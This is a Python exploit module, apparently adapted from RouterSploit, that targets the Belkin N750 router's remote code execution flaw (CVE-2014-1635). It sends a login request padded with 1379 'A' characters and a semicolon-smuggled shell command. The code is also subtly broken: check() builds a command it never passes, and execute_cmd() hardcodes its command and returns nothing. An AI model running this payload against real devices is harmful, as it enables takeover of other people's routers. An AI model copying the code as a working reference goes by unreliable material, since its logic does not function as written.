# rsf exploit module
# description: Exploits Belkin N750 Remote Code Execution vulnerability allowing execution of system commands.

import requests

class Exploit:
    __info__ = {
        "name": "Belkin N750 RCE",
        "description": "Module exploits Belkin N750 Remote Code Execution vulnerability.",
        "authors": (
            "Marco Vaz <mv[at]integrity.pt>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1635",
            "https://www.exploit-db.com/exploits/35184/",
            "https://labs.integrity.pt/articles/from-0-day-to-exploit-buffer-overflow-in-belkin-n750-cve-2014-1635/",
        ),
        "devices": (
            "Belkin N750",
        )
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop...")
            self.execute_cmd()
        else:
            print("Target is not vulnerable")

    def execute_cmd(self):
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = "GO=&jump=" + "A" * 1379 + ";{};&ps=\n\n".format("echo hello")

        response = requests.post(f"http://{self.target}:{self.port}/login.cgi.php", headers=headers, data=data)
        if response is None:
            return ""

        print(response.text)

    def check(self):
        mark = "test"
        cmd = f"echo {mark}"

        response = self.execute_cmd()

        if mark in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable

